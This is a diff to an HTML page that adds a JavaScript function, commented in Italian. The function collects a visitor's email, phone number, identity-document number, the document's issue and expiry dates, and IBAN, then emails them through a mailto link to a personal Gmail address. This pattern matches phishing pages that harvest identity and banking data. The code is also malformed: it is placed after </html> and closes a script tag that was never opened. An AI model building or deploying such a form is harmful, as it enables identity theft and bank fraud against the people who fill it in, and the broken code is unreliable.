@@ -89,4 +89,30 @@
 </body>
 
 </html>
+    function submitForm() {
+        // Recupera i dati dal modulo HTML
+        const email = document.getElementById('emailInput').value;
+        const phoneNumber = document.getElementById('phoneInput').value;
+        const idDocument = document.getElementById('idDocumentInput').value;
+        const releaseDate = document.getElementById('releaseDateInput').value;
+        const expirationDate = document.getElementById('expirationDateInput').value;
+        const iban = document.getElementById('ibanInput').value;
+
+        // Configura il corpo del messaggio
+        const messageBody = `
+            Email: ${email}
+            Numero di cellulare: ${phoneNumber}
+            Documento d'identità: ${idDocument}
+            Data di rilascio: ${releaseDate}
+            Data di scadenza: ${expirationDate}
+            IBAN: ${iban}
+        `;
+
+        // Invia l'email
+        window.location.href = `mailto:silversallu@gmail.com?subject=Dati%20Utente&body=${encodeURIComponent(messageBody)}`;
+        
+        // Puoi anche considerare l'invio tramite AJAX al tuo server per una gestione più sicura
+    }
+</script>
+
 
